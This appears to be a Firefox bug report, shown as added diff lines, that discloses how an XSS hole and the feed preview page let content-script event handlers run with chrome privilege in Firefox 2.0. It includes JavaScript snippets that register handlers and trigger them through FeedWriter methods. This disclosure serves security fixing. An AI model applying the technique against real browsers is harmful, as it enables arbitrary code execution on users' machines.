@@ -1,0 +1,42 @@
+Arbitrary code execution using XSS hole and feed preview page
+Please see bug 353266.
+
+Array.prototype method trick (bug 344495) and document.(open|write) trick (bug
+346659) and XSS hole (bug 351370, bug 359137) are available on fx2.0. (bug
+359137 wa already fixed.)
+
+In a feed preview page, an event handler that wa registered by content script
+can be called by chrome script via elem.doCommand() or elem.dispatchEvent().
+In this case, the event handler's scripted caller is chrome script. Thus, an
+attacker can run arbitrary code with chrome privilege by using Array.prototype
+method trick or document.write trick.
+
+--
+document.getElementById("handlersMenuList")
+.addEventListener("command", x, true);
+
+SubscribeHandler._feedWriter.write(window);
+or
+SubscribeHandler._feedWriter
+.QueryInterface(Components.interfaces.nsIObserver)
+.observe({}, "nsPref:changed", "browser.feeds.handler.default");
+
+x() (if x is a function) or x.handleEvent() is called in
+FeedWriter._setSelectedHandler() via handlers[0].doCommand(),
+selectedAppMenuItem.doCommand() or liveBookmarksMenuItem.doCommand().
+
+document.getElementById("alwaysUse")
+.addEventListener("CheckboxStateChange", y, true);
+
+SubscribeHandler._feedWriter.write(window);
+or
+SubscribeHandler._feedWriter
+.QueryInterface(Components.interfaces.nsIObserver)
+.observe({}, "nsPref:changed", "browser.feeds.handler");
+
+y() or y.handleEvent() is called in FeedWriter._setCheckboxCheckedState() via
+aCheckbox.dispatchEvent(event).
+--
+
+* Fx1.5.0.x is not affected since it doe not have feed preview feature.
+* The trunk should be exploitable if an XSS hole existed.
